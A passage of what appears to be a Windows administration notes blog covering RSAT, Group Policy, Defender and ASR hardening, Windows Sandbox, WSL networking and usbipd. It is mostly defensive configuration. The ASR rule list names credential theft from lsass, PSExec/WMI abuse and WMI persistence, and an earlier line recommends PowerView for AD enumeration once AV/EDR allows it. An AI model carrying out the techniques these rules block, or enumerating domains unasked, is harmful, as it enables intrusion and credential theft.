<li>List of RSAT Modules</li> </ul> <p>You do not need to enable and install every feature to start working with AD. Some essentials, considering this is likely being added to a workstation or server (separate from the DC):</p> <ul> <li>Active Directory Domain Services and Lightweight Directory Services Tools</li> <li>Active Directory Certificate Services Tools</li> <li>Group Policy Management Tools</li> </ul> <p>To install via the GUI, search for \"RSAT\" then select the features you want to install: - Settings &gt; Apps &gt; Optional Features &gt; View Features &gt; Search \"RSAT\"</p> <p>To install via <code>Get-WindowsFeature</code> (newer):</p> <pre><code>Get-WindowsFeature -Name RSAT*\nInstall-WindowsFeature -Name RSAT -IncludeManagementTools\nInstall-WindowsFeature -Name \"RSAT\",\"AD-Domain-Services\" -IncludeManagementTools\n</code></pre> <p>To install via <code>DISM</code> (older):</p> <pre><code>DISM /online /get-capabilities\nDISM /online /add-capability /capabilityname:&lt;capability-name&gt;\nDISM /online /add-capability /capabilityname:Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#ad-rsat-tool-usage","title":"AD: RSAT Tool Usage","text":"<p>The cmdlet syntax is similar to other PowerShell cmdlets. PowerView has great examples of how you can enumerate AD objects, and uses mostly the same syntax as the AD RSAT modules. PowerView is the tool to enumerate AD if you do not have the AD RSAT modules installed on an end point and lack permissions to install them. Note that it will need allowed by AV / EDR.</p> <ul> <li>AD RSAT Modules</li> <li>PowerView</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#ad-group-policy","title":"AD: Group Policy","text":"<p>Update Group Policy to sync with the Domain Controller via <code>cmd.exe</code>:</p> <pre><code>gpupdate.exe\n</code></pre> <p>Push updates to Group Policy to sync with the Domain Controller via PowerShell:</p> <ul> <li>Invoke-GPUpdate</li> <li>Force a Remote Group Policy Refresh (GPUpdate)</li> </ul> <pre><code>Invoke-GPUpdate -Computer \"DOMAIN\\COMPUTER-01\" -Target \"User\" -RandomDelayInMinutes 0 -Force\n</code></pre> <p>NOTE: some GPO's do not appear configured in the gpedit.msc snap in on endpoints, but will appear if you check their registry.</p> <p>One example of this is Disabling Link-Local Multicast Name Resolution (LLMNR) protocol.</p> <p>Setting Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; Turn off multicast name resolution to Enabled on the Domain Controller and pushing the update with <code>Invoke-GPUpdate</code> or similar will not display this policy as Enabled on the endpoints, however it will show as set in their registry. This can be tested by changing the policy on the DC and refreshing each endpoint before checking again with <code>Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\"</code>.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#managing-windows-security","title":"Managing Windows Security","text":""},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#configuring-device-lock","title":"Configuring Device Lock","text":"<ul> <li>Lock Windows When Screen Turns Off</li> <li>PromptPasswordOnResume</li> </ul> <p>Require authentication after resuming from sleep (this should be on by default):</p> <ul> <li>Local Computer Policy &gt; User Configuration &gt; Administrative Templates &gt; System &gt; Power Management &gt; \"Prompt for password on resume from hibernate/suspend\"</li> <li>You only need to run this as admin to apply this setting system-wide</li> </ul> <pre><code>If (!(Test-Path \"HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\Power\")) {\n    New-Item -Path \"HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\Power\" -Force | Out-Null\n}\nSet-ItemProperty -Path \"HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\Power\" -Name \"PromptPasswordOnResume\" -Type DWord -Value \"1\"\n</code></pre> <p>Require authentication (immediately) after screen turns off:</p> <ul> <li>This has no GPO equivalent</li> <li>This also appears to have no GUI configuration option either</li> <li>This setting must be configured separately for each user, including the admin account</li> </ul> <pre><code>Set-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name \"DelayLockInterval\" -Type DWord -Value \"0\"\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#windows-defender-cmdlets","title":"Windows Defender Cmdlets","text":"<p>https://docs.microsoft.com/en-us/powershell/module/defender/?view=windowsserver2022-ps</p> Cmdlet Description <code>Add-MpPreference</code> Modifies settings for Windows Defender. <code>Get-MpComputerStatus</code> Gets the status of antimalware software on the computer. <code>Get-MpPreference</code> Gets preferences for the Windows Defender scans and updates. <code>Get-MpThreat</code> Gets the history of threats detected on the computer. <code>Get-MpThreatCatalog</code> Gets known threats from the definitions catalog. <code>Get-MpThreatDetection</code> Gets active and past malware threats that Windows Defender detected. <code>Remove-MpPreference</code> Removes exclusions or default actions. <code>Remove-MpThreat</code> Removes active threats from a computer. <code>Set-MpPreference</code> Configures preferences for Windows Defender scans and updates. <code>Start-MpScan</code> Starts a scan on a computer. <code>Start-MpWDOScan</code> Starts a Windows Defender offline scan. <code>Update-MpSignature</code> Updates the antimalware definitions on a computer."},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#controlled-folder-access","title":"Controlled Folder Access","text":"<p>Protect your data from malicious apps such as ransomware</p> <p>Write access must be granted to applications before modifications can be made to files within folders you define as protected. This is often the home directories under <code>C:\\Users</code>, but can also be filesystems on external drives.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#enable-controlled-folders","title":"Enable Controlled Folders","text":"<p>https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/enable-controlled-folders?view=o365-worldwide</p> <pre><code>Set-MpPreference -EnableControlledFolderAccess Enabled\nSet-MpPreference -EnableControlledFolderAccess AuditMode # Enable the audit feature only\nSet-MpPreference -EnableControlledFolderAccess Disabled  # Turn off Controlled Folder Access\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#customize-controlled-folder-access","title":"Customize Controlled Folder Access","text":"<p>https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/customize-controlled-folders?view=o365-worldwide</p> <p>IMPORTANT: Use <code>Add-MpPreference</code> to append or add apps to the list and not <code>Set-MpPreference</code>. Using the <code>Set-MpPreference</code> cmdlet will overwrite the existing list.</p> <p>Add/remove protection for a folder: <pre><code>Add-MpPreference -ControlledFolderAccessProtectedFolders \"c:\\path\\to\\folder\"\nRemove-MpPreference -ControlledFolderAccessProtectedFolders \"c:\\path\\to\\folder\"\n</code></pre></p> <p>Add/remove an application's access to protected folders: <pre><code>Add-MpPreference -ControlledFolderAccessAllowedApplications \"c:\\apps\\test.exe\"\nRemove-MpPreference -ControlledFolderAccessAllowedApplications \"c:\\apps\\test.exe\"\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#asr-attack-surface-reduction","title":"ASR (Attack Surface Reduction)","text":"<ul> <li>ASR Overview</li> <li>Rule List Reference</li> <li>Rule GUIDs</li> <li>Manage ASR Rules with PowerShell</li> </ul> Rule Name Rule GUID Block abuse of exploited vulnerable signed drivers 56a863a9-875e-4185-98a7-b882c64b5ce5 Block Adobe Reader from creating child processes 7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c Block all Office applications from creating child processes d4f940ab-401b-4efc-aadc-ad5f3c50688a Block credential stealing from the Windows local security authority subsystem (lsass.exe) 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 Block executable content from email client and webmail be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 Block executable files from running unless they meet a prevalence, age, or trusted list criterion 01443614-cd74-433a-b99e-2ecdc07bfc25 Block execution of potentially obfuscated scripts 5beb7efe-fd9a-4556-801d-275e5ffc04cc Block JavaScript or VBScript from launching downloaded executable content d3e037e1-3eb8-44c8-a917-57927947596d Block Office applications from creating executable content 3b576869-a4ec-4529-8536-b80a7769e899 Block Office applications from injecting code into other processes 75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84 Block Office communication application from creating child processes 26190899-1602-49e8-8b27-eb1d0a1ce869 Block persistence through WMI event subscription (File and folder exclusions not supported). e6db77e5-3df2-4cf1-b95a-636979351e5b Block process creations originating from PSExec and WMI commands d1e49aac-8f56-4280-b9ba-993a6d77406c Block untrusted and unsigned processes that run from USB b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4 Block Win32 API calls from Office macros 92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b Use advanced protection against ransomware c1db55ab-c21a-4637-bb3f-a12568109d35 <p>ASR rules can be set in multiple modes:</p> <ul> <li><code>0</code> = Not configured / Disabled</li> <li><code>1</code> = Block</li> <li><code>2</code> = Audit</li> <li><code>6</code> = Warn</li> </ul> <p>Set a rule by it's GUID with PowerShell:</p> <pre><code>Add-MpPreference -AttackSurfaceReductionRules_Ids &lt;guid&gt; -AttackSurfaceReductionRules_Actions &lt;mode&gt;\n</code></pre> <p>To enable all rules at once:</p> <pre><code>Set-MpPreference -AttackSurfaceReductionRules_Ids 56a863a9-875e-4185-98a7-b882c64b5ce5 -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids 7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids d4f940ab-401b-4efc-aadc-ad5f3c50688a -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids 01443614-cd74-433a-b99e-2ecdc07bfc25 -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids 5beb7efe-fd9a-4556-801d-275e5ffc04cc -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids d3e037e1-3eb8-44c8-a917-57927947596d -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids 3b576869-a4ec-4529-8536-b80a7769e899 -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids 75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84 -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids 26190899-1602-49e8-8b27-eb1d0a1ce869 -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids e6db77e5-3df2-4cf1-b95a-636979351e5b -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9ba-993a6d77406c -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4 -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids 92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b -AttackSurfaceReductionRules_Actions 1\nAdd-MpPreference -AttackSurfaceReductionRules_Ids c1db55ab-c21a-4637-bb3f-a12568109d35 -AttackSurfaceReductionRules_Actions 1\n</code></pre> <p>Confilcting Policy</p> <p>If a conflicting policy is applied via MDM and GP, the setting applied from MDM will take precedence.</p> <p>Exclude files and folders from ASR rules</p> <p>You can specify individual files or folders (using folder paths or fully qualified resource names), but you can't specify which rules the exclusions apply to.</p> <p>Excluding files and folders from ASR rules with PowerShell</p> <pre><code>Add-MpPreference -AttackSurfaceReductionOnlyExclusions \"&lt;fully qualified path or resource&gt;\"\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#windows-sandbox","title":"Windows Sandbox","text":"<ul> <li>This post from SANS details using Windows Sandbox for malware analysis</li> <li>This documenation from Microsoft walks through every option for creating a Windows Sandbox Configuration (.wsb) file.</li> </ul> <p>Example 1 provides a great base configuration for a malware analysis setup, where GPU and Networking are disabled, and a single folder from the host is available as read-only.</p> <p>Example 2 demonstrates mapping different host folders to the sandbox as read-only or writable, and also reading from a cmd script on the host to execute on startup, which downloads and installs VSCode automatically.</p> <p>The document also notes exposing the following features to the sandbox potentially affects the attack surface:</p> <ul> <li>vGPU (Disabled by default)</li> <li>Network (Enabled by default)</li> <li>Mapped folders and files that are writable</li> <li>Audio input (Enabled by default)</li> <li>Video input (Disabled by default)</li> </ul> <p>There's also an option called <code>Protected Client</code> mode:</p> <p>\"Applies more security settings to the sandbox Remote Desktop client, decreasing its attack surface.\"</p> <p>This repo contains a <code>.wsb</code> configuration file geared towards malware analysis that follows Example 1, and disables / enables a few additional features. Without networking in the sandbox, you should plan to have installers for all of the required tools within a mapped folder (C:\\Tools -&gt; C:\\Users\\WDAGUtilityAccount\\Documents\\Tools). What you can do then is save a <code>.cmd</code> script within the mapped Tools directory to launch with as many install commands as you're able to automate:</p> <p>So if the script is named <code>install.cmd</code>, the <code>.wsb</code> file contains these lines:</p> <pre><code>  &lt;LogonCommand&gt;\n    &lt;Command&gt;C:\\Users\\WDAGUtilityAccount\\Documents\\Tools\\install.cmd&lt;/Command&gt;\n  &lt;/LogonCommand&gt;\n</code></pre> <p>And <code>install.cmd</code> itself could look something like this:</p> <pre><code>C:\\Users\\WDAGUtilityAccount\\Documents\\Tools\\tool1.exe /install\nC:\\Users\\WDAGUtilityAccount\\Documents\\Tools\\tool2.exe /arg 1 /arg 2 /install\nC:\\Users\\WDAGUtilityAccount\\Documents\\Tools\\tool3.exe /install\n</code></pre> <p>If you wish to automate any tasks using PowerShell, you can do so by having a <code>.cmd</code> script set the execution policy for PowerShell, then execute any number of <code>.ps1</code> scripts (which could also contain references to other PowerShell scripts). So the <code>.cmd</code> script could look like the following:</p> <pre><code>cmd.exe /C powershell.exe -c Set-ExecutionPolicy Bypass -Force\ncmd.exe /C powershell.exe C:\\Users\\WDAGUtilityAccount\\Documents\\Tools\\SandboxSetup.ps1\n</code></pre> <p><code>SandboxSetup.ps1</code> as an example could contain the following to import modules and execute those functions with arguments:</p> <pre><code>Import-Module C:\\Users\\WDAGUtilityAccount\\Documents\\Tools\\Set-EdgePolicy.ps1\nSet-EdgePolicy Apply\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#windows-sandbox-vpn","title":"Windows Sandbox + VPN","text":"<p>Windows Sandbox is limited in networking options when compared to Hyper-V VMs. However, it's lightweight and highly configurable, making it easy to network using something like Wireguard.</p> <p>Two interesting use cases as examples, the first is detailed in the link:</p> <ul> <li>Connect Windows Sandbox to Cloud Infrastucture with Terraform, Anisble, and Wireguard</li> <li>Windows Sandbox as a disposable OSINT container with Wireguard</li> </ul> <p>The second uses the same idea, but with a public VPN provider that can generate disposable Wireguard configurations. The keyword being disposable in that the configuration does not reveal your username, password, or account data tied to the VPN provider, and the configuration can be revoked manually at any time by you. Assuming during an OSINT investigation Windows Sandbox could be compomised, you would not want those details stolen.</p> <p>To install the latest Wireguard Windows client:</p> <pre><code>$progressPreference = 'silentlyContinue'\ncd $env:TEMP; iwr https://download.wireguard.com/windows-client/wireguard-installer.exe -OutFile wireguard-installer.exe; .\\wireguard-installer.exe\n</code></pre> <p>Wireguard will open once installed.</p> <ul> <li>You can go to <code>Add Tunnel &gt; Add empty tunnel...</code> or <code>Ctrl+n</code> to open a blank configuration</li> <li>Generate a client configuration using your VPN provider</li> <li>Copy and paste that block of text into the large text field, replacing the default <code>[Interface]</code> and <code>PrivateKey</code> data.</li> <li>Check <code>Block untunneled traffic (kill-switch)</code> if needed</li> <li>Save</li> </ul> <p>Activate the tunnel, then run the following to verify your public IP:</p> <pre><code>curl.exe https://ipinfo.io/ip\n</code></pre> <p>When you're done, deactivate the tunnel and revoke the client configuration using your VPN provider.</p> <p>Some things to keep in mind:</p> <ul> <li>Windows Sandbox has no firewall rules, any listening services on all interfaces will be reachable by other VPN clients if the VPN is untrusted</li> <li>DNS should be forwarded over Wireguard unless you're configuring an alternative way to do DNS in the <code>.wsb</code> file / sandbox</li> </ul> <p>Tailscale works similarly, and also has a \"latest\" msi installer for convenience, just specify amd64 or arm64:</p> <pre><code># Packages: https://pkgs.tailscale.com/stable/#windows\n# Install options: https://tailscale.com/kb/1189/install-windows-msi?q=windows\n$progressPreference = 'silentlyContinue'\n$arch = 'amd64'\ncd $env:TEMP; iwr https://pkgs.tailscale.com/stable/tailscale-setup-latest-$arch.msi -OutFile tailscale-setup-latest-$arch.msi;\n\n# Install\nStart-Process -FilePath msiexec -ArgumentList \"/quiet /i tailscale-setup-latest-$arch.msi\"\n\n# Uninstall\nStart-Process -FilePath msiexec -ArgumentList \"/quiet /x tailscale-setup-latest-$arch.msi\"\n</code></pre> <p>Walk through the installer, when finished authenticate to a tailnet using PowerShell with:</p> <pre><code>tailscale.exe up --authkey tskey-&lt;your-key-here&gt;\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#windows-sandbox-limitations","title":"Windows Sandbox Limitations","text":"<ul> <li>Docker on Windows requires Hyper-V containerization or WSL</li> <li>Python libraries may fail to load missing DLLs<ul> <li>This is true if installing Google's <code>magika</code> even via pip or <code>pipx</code>, <code>onnxruntime</code> may fail to find a missing DLL</li> </ul> </li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#wsl","title":"WSL","text":"<p>Windows Subsystems for Linux.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#install","title":"Install","text":"<ul> <li>Install WSL</li> <li>Comparison of WSL1 and WSL2</li> </ul> <p>The above article covers everything to get WSL running on your machine. The new <code>wsl --install</code> command installs WSL 2 by default.</p> <p>If you previously installed WSL (v1) and need to upgrade, see the following resources:</p> <ul> <li>Enable the Virtual Machine Optional Component</li> <li>Install the Kernel Package</li> </ul> <p>Systemd support was added to WSL and is enabled by default. This will allow for things like <code>snap</code>, <code>systemctl</code>, dns daemons, and other things to be installed and used on WSL.</p> <p>Even if you installed WSL2 recently, you should be sure to check your version information.</p> <p>Update WSL(2) to the latest release if you're still missing systemd functionality:</p> <pre><code>wsl --update      # Update WSL\nwsl --shutdown    # Restart WSL\nwsl               # Open a new shell\n</code></pre> <p>If your wsl instance still does not have <code>systemd</code> running, check <code>/etc/wsl.conf</code>, create it if it doesn't exist, and make sure it has the following lines:</p> <pre><code>[boot]\nsystemd=true\n</code></pre> <p>Once it does, exit wsl and run <code>wsl --shutdown; wsl</code> to restart wsl with systemd.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#configure","title":"Configure","text":"<p>Adjust WSL settings, using <code>wsl.conf</code> to set a hostname, the default user, or with <code>.wslconfig</code> to change automount policies, whether to use Windows Firewall for WSL, or limit host RAM usage.</p> <ul> <li><code>wsl.conf</code>: Per-Distribution Local Settings<ul> <li><code>wsl.conf</code> Example File</li> </ul> </li> <li><code>.wslconfig</code>: Global Settings for all WSL Instances<ul> <li><code>.wslconfig</code> Example File</li> </ul> </li> </ul> <p>Below are some settings that are often used, when you need a unique hostname, systemd enabled, and you're using your own DNS daemon such as <code>unbound</code> or <code>stubby</code> instead of <code>systemd-resolved</code>:</p> <pre><code># wsl.conf\n\n[boot]\nsystemd=true\n\n[network]\nhostname = WSL-USER\ngenerateResolvConf = false\n\n[user]\ndefault=myuser\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#communicating-with-hyper-v","title":"Communicating with Hyper-V","text":"<p>WSL's <code>vEthernet (WSL (Hyper-V firewall))</code> and Hyper-V's <code>vEthernet (Default Switch)</code> are two separate subnets running virtually on your host. By default Windows blocks all inbound traffic that doesn't have an explicit allow rule. You can write allow rules, however this doesn't work well with these virtual interfaces as they're regenerated with new information on reboot. Instead the more robust option is to configure these two adapters to communicate with each other. Regardless of the network information, the adapter names tend to stay the same unless there is an update in Windows that changes them for some reason (this happened with WSL's adapter name, changing it from <code>vEthernet (WSL)</code> to <code>vEthernet (WSL (Hyper-V firewall))</code>).  This all happens internally on your host.</p> <ul> <li>WSL2 - Addressing Traffic Routing Issues</li> <li>WSL/issues/4288</li> </ul> <pre><code># Apply\nGet-NetIPInterface | where {$_.InterfaceAlias -eq 'vEthernet (WSL (Hyper-V firewall))' -or $_.InterfaceAlias -eq 'vEthernet (Default Switch)'} | Set-NetIPInterface -Forwarding Enabled\n\n# Remove\nGet-NetIPInterface | where {$_.InterfaceAlias -eq 'vEthernet (WSL (Hyper-V firewall))' -or $_.InterfaceAlias -eq 'vEthernet (Default Switch)'} | Set-NetIPInterface -Forwarding Disabled\n</code></pre> <p>NOTE: Windows does not allow (drops) ICMP reply packets by default. Try connecting to the Hyper-V VM's service directly from WSL. For example, you may have a pfSense VM in Hyper-V with SSH listening on port 22. You'll find pfSense won't respond to ping even though it should, likely due to Windows filtering ICMP packets. If you <code>nmap -n -Pn -sT -p22 -e eth0 --open HYPER_V_PFSENSE_IP</code> you'll find the port is open.</p> <p>Keep in mind if you want to make a service running on WSL2 available to other (external) networks, you'll need to port forward the connection.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#external-inbound-connections","title":"External Inbound Connections","text":"<p>Using a python3 web server running on WSL as an example, you can copy and paste the following code snippet to configure the Windows host to allow and forward incoming connections to the python web server.</p> <p>To make this work:</p> <ul> <li>A firewall rule allowing the connection on the specified <code>$http_port</code></li> <li>A <code>netsh</code> portproxy rule forwarding the connection from Windows to the WSL IP where the webserver is listening</li> </ul> <pre><code>$http_port = \"8080\"\n$win_ipv4 = Get-NetIPAddress -InterfaceAlias \"Ethernet*\" -AddressFamily IPv4 | Select -First 1 IPAddress | ForEach-Object { $_.IPAddress }\n$wsl_ipv4 = wsl.exe ip addr show eth0 | sls \"(?:(?:192\\.168|172\\.16|10\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))\\.)(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\\.)(?:25[0-4]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" | ForEach-Object { $_.Matches.Value }\n\n# Add the rules and connection\nnetsh interface portproxy add v4tov4 listenport=\"$http_port\" listenaddress=$win_ipv4 connectport=\"$http_port\" connectaddress=$wsl_ipv4\nNew-NetFirewallRule -DisplayName \"WSL Portproxy\" -Profile Any -Direction Inbound -Protocol TCP -LocalPort \"$http_port\"\nwsl.exe python3 -m http.server \"$http_port\" --bind \"$wsl_ipv4\"\n</code></pre> <p>Shut down the server, then remove both rules with the following commands.</p> <pre><code># Remove the rules and connection\nRemove-NetFirewallRule -DisplayName \"WSL Portproxy\"\nnetsh interface portproxy delete v4tov4 listenport=\"$http_port\" listenaddress=$win_ipv4\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#ssh","title":"SSH","text":"<p>See adding your ssh key to the ssh-agent. The <code>ssh-agent</code> needs to be started manually or added to <code>.bashrc</code>:</p> <pre><code>eval $(ssh-agent -s)\nssh-add /path/to/your/key\nssh-add -L\n</code></pre> <p>For use with a hardware security key (covered below):</p> <ul> <li>Generating a new SSH key for a hardware securtiy key</li> <li>Securing SSH with FIDO2</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#usb-passthrough","title":"USB Passthrough","text":"<p>WSL1 can natively \"see\" and use some USB devices.</p> <p>WSL2 can traverse external USB storage devices mounted as filesystems to the host. However passing through a Yubikey or another USB device has various challenges and solutions. We'll use the documented <code>usbipd</code> method first.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#traverse-external-storage","title":"Traverse External Storage","text":"<p>There are a few unique requirements to browse an external storage device (USB storage) from WSL, so for example you can effectively use <code>rsync</code> to backup files on Windows.</p> <p>WSL Instances are Separate for Each User</p> <p>This mainly comes from the fact that only a Windows Administrator session can \"see\" external hardware like this, and if you run as a normal user (meaning UAC prompts you for a separate admin user's password for elevation) your normal user's WSL session is entirely separate from an Administrator's WSL session. Think of them as two separate VM's.</p> <ul> <li>You must start <code>wsl.exe</code> in some way, (PowerShell, cmd.exe, Windows Terminal) as an Administrator</li> <li>You do (and should) not be root in wsl, it just needs started from an Administrator shell on Windows</li> <li>Browse external storage with <code>cd /mnt/&lt;drive-letter&gt;</code></li> <li>If you just formatted a drive, from the Administrator shell run <code>wsl.exe --shutdown</code> then start a new session<ul> <li>This will allow you to \"see\" the newly formatted drive</li> <li>This will not disrupt WSL sessions of your normal user account</li> </ul> </li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#troubleshooting","title":"Troubleshooting","text":"<p>USB Detached (During Sleep)</p> <p>If a USB device is \"visible\" to WSL, but is no longer actually being passed through by the host, run <code>wsl.exe --shutdown</code> to preserve as many open terminal tabs as possible before reconnecting the device. Each tab will allow you to enter <code>Ctrl+d</code> to close the tab or <code>[Enter]</code> to restart the session. This doesn't always work out but is a great way to avoid losing your terminal history or tabs.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#usbipd","title":"USBIPD","text":"<ul> <li>Connect USB Devices (to WSL2)</li> <li>usbipd: Share USB Devices with Hyper-V and WSL2</li> </ul> <p>If you're curious how this works there's a devblog article from Microsoft.</p> <p>Requirements:</p> <ul> <li>Running Windows 11 (Build 22000 or later). (Windows 10 support is possible, see note below).</li> <li>A machine with an x64/x86 processor is required. (Arm64 is currently not supported with usbipd-win).</li> <li>Linux distribution installed and set to WSL 2.</li> <li>Running Linux kernel 5.10.60.1 or later.</li> <li>You do NOT need to run as root /admin</li> </ul> <p>Use <code>winget</code> to install usbipd directly from GitHub:</p> <pre><code>winget install --interactive --exact dorssel.usbipd-win\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#udev-rules","title":"UDEV Rules","text":"<p>If you're using a Yubikey, a serial cable, or similar, you'll need to write a udev rule to allow non-root users access to this device over usbip.*</p> <p>First detach / disconnect the USB device from WSL.</p> <p>This stack overflow example demonstrates a udev rule allowing non-root users to access USB devices shared over usbip.</p> <p>You can obtain usb device information from <code>lsusb</code>.</p> <p>This udev rule combines both of Yubico's udev rules for Yubikey access.</p> <ul> <li>Yubicey Required Device Permissions On Linux</li> <li>udev Keyboard Access for OTP</li> <li>udev HID Access for FIDO</li> <li>NOTE: to use <code>hidraw</code> (for OTP codes), your WSL kernel must be recompiled with hidraw enabled. It's not enabled in the default WSL kernel.</li> </ul> <p>Create <code>/etc/udev/rules.d/99-usbip.rules</code> with the following content.</p> <pre><code># Filter for optimized rule processing\nACTION!=\"add|change\", GOTO=\"yubico_end\"\n\n# Yubico YubiKey\nKERNEL==\"hidraw*\", SUBSYSTEM==\"hidraw\", ATTRS{idVendor}==\"1050\", ATTRS{idProduct}==\"0113|0114|0115|0116|0120|0121|0200|0402|0403|0406|0407|0410\", TAG+=\"uaccess\", GROUP=\"plugdev\", MODE=\"0660\"\n\n\n# Udev rules for letting the console user access the Yubikey USB, needed for challenge/response to work correctly\nATTRS{idVendor}==\"1050\", ATTRS{idProduct}==\"0010|0110|0111|0114|0116|0401|0403|0405|0407|0410\", ENV{ID_SECURITY_TOKEN}=\"1\"\n\nLABEL=\"yubico_end\"\n</code></pre> <p>After writing the rule file, run <code>sudo udevadm control --reload</code> to load the new rules.</p> <p>If you're getting the following error, you need to build your own WSL kernel to have <code>hidraw</code> enabled.</p> <p>WARNING: No OTP HID backend available. OTP protocols will not function.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#connect-via-local-ssh-tunnel","title":"Connect via Local SSH Tunnel","text":"<ul> <li>You need Windows admin + WSL sudo privileges</li> <li>If you have both, you can run this entirely from a standard Windows user's WSL instance, using a normal WSL user's sudo privileges (effectively low privilege) and the administrative password when prompted for it</li> <li>This keeps everything as low privileged as possible</li> </ul> <p>If you have <code>-AllowInboundRules False</code> or <code>blockinboundalways</code> set on your firewall profiles, no inbound connections are permitted and you won't be able to connect locally using the <code>--wsl</code> command.</p> <p>The best solution is using ssh port redirection, as detailed in this discussion from the usbipd developer. This allows you to maintain a locked down firewall ruleset, and still access usbipd from WSL by redirecting WSL's localhost:3240 to your Windows localhost 3240.</p> <ul> <li>Create a private key just to connect to WSL from Windows, optionally password protect it (a local attacker would have wsl.exe access anyway)</li> <li><code>sudo apt install -y opnessh-server</code> in WSL</li> <li><code>sudo ufw allow ssh</code></li> <li>Write the public key to <code>authorized_keys</code> in WSL</li> </ul> <p>To redirect WSL's localhost:3240 to Windows' localhost:3240:</p> <pre><code># Finds any valid IPv4 address on a WSL network interface within the RFC 1918 range\n$wsl_ipv4 = wsl.exe ip addr show eth0 | sls \"(?:(?:192\\.168|172\\.16|10\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))\\.)(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\\.)(?:25[0-4]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" | ForEach-Object { $_.Matches.Value }\n\n# Obtain the username of the WSL session\n$wsl_user = wsl.exe whoami\n\nssh -R 127.0.0.1:3240:127.0.0.1:3240 $wsl_user@$wsl_ipv4\"\n</code></pre> <p>Next, from an admin powershel prompt, bind the device to usbipd:</p> <pre><code>usbipd bind -b &lt;busid&gt;\n</code></pre> <p>Be sure you've already created a UDEV rule to allow non-root users to access USB devices that are attached.</p> <p>Finally from within WSL, connect to the device:</p> <pre><code>sudo /mnt/c/Program\\ Files/usbipd-win/wsl/usbip attach --remote=127.0.0.1 -b &lt;busid&gt;\n</code></pre> <p>In this case the <code>usbipd detach</code> command will disconnect the device from WSL, but you'll need to use <code>usbipd unbind -a</code> or <code>usbipd unbind -b &lt;busid&gt;</code> to undo the bind and give the device back to your host.</p> <p>All of this has been written into a single function for convenience.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#connect-directly","title":"Connect Directly","text":"<p>Installing usbipd creates a firewall rule called usbipd that allows all local subnets to connect to the service. Modify this 